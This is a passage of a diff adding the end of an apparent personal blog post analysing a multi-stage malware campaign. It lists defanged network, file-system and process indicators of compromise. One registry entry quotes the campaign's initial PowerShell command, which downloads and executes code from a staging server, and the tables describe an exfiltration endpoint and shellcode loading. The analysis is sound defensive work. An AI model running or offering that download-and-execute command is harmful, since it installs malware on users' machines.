+                <tr><td><code>158[.]94[.]209[.]33</code></td><td>Stage 1 staging server. Returned <code>stage1.txt</code> as plain text via HTTP GET. No User-Agent filtering.</td></tr>
+                <tr><td><code>178[.]16[.]53[.]70</code></td><td>Stage 2 host. Returned <code>stage2.txt</code> as plain text via HTTP GET. No User-Agent filtering.</td></tr>
+                <tr><td><code>178[.]16[.]52[.]201</code></td><td>Stage 3 + 4 binary payload host. Apache/2.4.18 (Ubuntu) on Port 80. Directory <code>/9cca20c6df659f72/</code> indexed once <code>User-Agent</code> was overridden to a PowerShell value.</td></tr>
+                <tr><td><code>158[.]94[.]210[.]166</code></td><td>Stage 4 exfiltration endpoint. Raw TCP, AES-256-encrypted payload.</td></tr>
+                <tr><td><code>sctlogin[.]click</code></td><td>MSI custom-action call-out for reinfection loop. Path <code>/captcha.php</code>. Domain no longer resolves at time of analysis. Registered approximately one month before campaign launch. VT 7/94, tagged "Spam". Known subdomains: <code>www.sctlogin[.]click</code>, <code>banking.sctlogin[.]click</code>.</td></tr>
+              </tbody>
+            </table>
+
+            <h3>File system artifacts</h3>
+            <table>
+              <thead>
+                <tr><th>Item</th><th>Description</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>C:\Users\[REDACTED]\AppData\Local\Temp\~vrf&lt;GetTickCount&gt;.msi</code></td><td>Stage 4 silent-installed MSI. Observed instance: <code>~vrf262689062.msi</code>. The numeric portion is <code>GetTickCount()</code> output, unique per execution.</td></tr>
+                <tr><td><code>HKU\&lt;SID&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></td><td>Run-dialog history entry for the initial command. Value name <code>a</code>, data <code>powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)\1</code>.</td></tr>
+              </tbody>
+            </table>
+
+            <h3>Process indicators</h3>
+            <table>
+              <thead>
+                <tr><th>Item</th><th>Description</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>winlogon.exe</code> → <code>userinit.exe</code> → <code>Explorer.EXE</code> → <code>PowerShell.exe</code></td><td>Initial process tree. <code>powershell.exe</code> parented to <code>explorer.exe</code> indicates a user-typed command from the Run dialog.</td></tr>
+                <tr><td><code>services.exe</code> → <code>svchost.exe</code> → <code>msiexec.exe</code> (parent chain at 11:41:58 UTC)</td><td>Stage 4 inside injected <code>svchost</code> calling <code>CreateProcess</code> on <code>msiexec</code>, eleven seconds after initial PowerShell.</td></tr>
+                <tr><td><code>Add-Type -TypeDefinition</code> (PowerShell script content)</td><td>Stage 2 inline C# compilation. Importing <code>VirtualAlloc</code>, <code>CreateThread</code>, <code>WaitForSingleObject</code> from <code>kernel32</code>.</td></tr>
+              </tbody>
+            </table>
+
+            <p class="back-link">← <a href="../">back to blog</a> &nbsp; · &nbsp; <a href="../../">home</a></p>
+
+          </div>
+        </div>
+
+        <div class="block" id="b-2" hidden>
+          <div class="line">
+            <span class="ps1"><span class="user">josh</span><span class="sep">@</span><span class="user">kiriakoff</span><span class="sep">:</span><span class="dir">~/blog</span><span class="sep">$</span></span><span class="caret"></span>
+          </div>
+        </div>
+
+      </section>
+    </div>
+
+    <footer class="footer">
+      <span>© <a href="../../">Josh Kiriakoff</a> · <span data-year>2026</span></span>
+    </footer>
+
+  </div>
+
+  <noscript>
+    <style>
+      [hidden]      { display: revert !important; }
+      .caret        { display: none !important; }
+      .anchor-link,
+      .copy-btn     { display: none !important; }
+    </style>
+  </noscript>
+
+  <script src="../../js/terminal.js" defer></script>
+</body>
+</html>
